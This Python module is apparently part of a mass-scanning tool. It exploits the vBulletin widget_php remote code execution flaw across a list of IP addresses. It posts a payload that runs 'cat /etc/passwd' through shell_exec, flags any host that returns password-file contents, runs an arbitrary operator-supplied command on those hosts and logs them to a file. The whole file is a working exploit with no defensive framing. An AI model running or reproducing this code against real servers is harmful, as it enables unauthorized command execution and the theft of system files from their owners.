#!/usr/bin/env python3
import sys

if __name__ == '__main__':
	print('DO NOT RUN THIS SCRIPT ON ITS OWN!')	
	sys.exit()

import asyncio
from aiohttp import *
import ipaddress
from termcolor import colored
import tqdm
import logging


def exploit(hostfile, outfile, command):
	logging.getLogger("aiohttp").setLevel(logging.CRITICAL)
	payload = {'widgetConfig[code]': 'echo shell_exec(\'cat /etc/passwd\');exit;'}
	vulnerable = []
	async def request(url, session):
		try:
			async with session.post(url, timeout=30, data=payload) as response:
				response = await response.text()
				if "root:x:" in response:
					vulnerable.append(url)
					if command == None:
						tqdm.tqdm.write(colored('URL: ', 'white' ) + colored(url, 'red'))
					if command != None:
						payload2 = {}
						build = 'echo shell_exec(\'{}\');exit;'.format(command)
						payload2['widgetConfig[code]'] = build
						async with session.post(url, timeout=30, data=payload2) as response2:
							response2 = await response2.text()
							tqdm.tqdm.write(colored('URL: ', 'white' ) + colored(url, 'red'))
							tqdm.tqdm.write(colored('Response: ', 'white' ) + colored(response2, 'red'))	
				return response
		except KeyboardInterrupt:
			sys.exit("\nClosing...")
		except:
			pass

	async def run(hostfile):	
		tasks = []
		async with ClientSession(connector=TCPConnector(verify_ssl=False)) as session:
			with open(hostfile, 'r') as targets:
				for line in targets:
					ip_ver = ipaddress.ip_address(str(line.strip('\n')))
					if ip_ver.version == 4:
						if hostfile == 'vbullet-443':
							task=asyncio.ensure_future(request('https://' + line.strip('\n') + '/index.php?routestring=ajax/render/widget_php', session))
						else:
							task=asyncio.ensure_future(request('http://' + line.strip('\n') + '/index.php?routestring=ajax/render/widget_php', session))
					else:
						if hostfile == 'vbullet-443':
							task=asyncio.ensure_future(request('https://[' + line.strip('\n') + ']' + '/index.php?routestring=ajax/render/widget_php', session))
						else:
							task=asyncio.ensure_future(request('http://[' + line.strip('\n') + ']' + '/index.php?routestring=ajax/render/widget_php', session))
					tasks.append(task)
			responses = []
			for f in tqdm.tqdm(asyncio.as_completed(tasks), total=len(tasks)):
				responses.append(await f)

	loop = asyncio.get_event_loop()
	future = asyncio.ensure_future(run(hostfile))
	loop.run_until_complete(future)
	if outfile != None:
		with open(outfile, 'a+') as outputname:
			for item in vulnerable:
				outputname.write("%s\n" % item)
